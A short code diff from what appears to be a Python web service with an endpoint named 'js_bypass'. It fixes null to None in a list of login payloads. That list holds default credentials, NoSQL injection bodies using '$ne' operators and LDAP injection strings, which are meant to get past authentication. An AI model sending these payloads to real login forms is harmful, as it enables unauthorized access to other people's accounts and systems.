@@ -1574,8 +1574,8 @@ def js_bypass(url: str, key: str = Depends(verify_key)):
         {"username": "root", "password": "root"},
         {"username": "test", "password": "test"},
         # NoSQL injection
-        {"username": {"$ne": null}, "password": {"$ne": null}},
-        {"email": {"$ne": null}, "password": {"$ne": null}},
+        {"username": {"$ne": None}, "password": {"$ne": None}},
+        {"email": {"$ne": None}, "password": {"$ne": None}},
         # LDAP injection
         {"username": "*)(uid=*))(|(uid=*", "password": "*)(uid=*))(|(uid=*"},
         {"email": "*)(uid=*))(|(uid=*", "password": "*)(uid=*))(|(uid=*"},
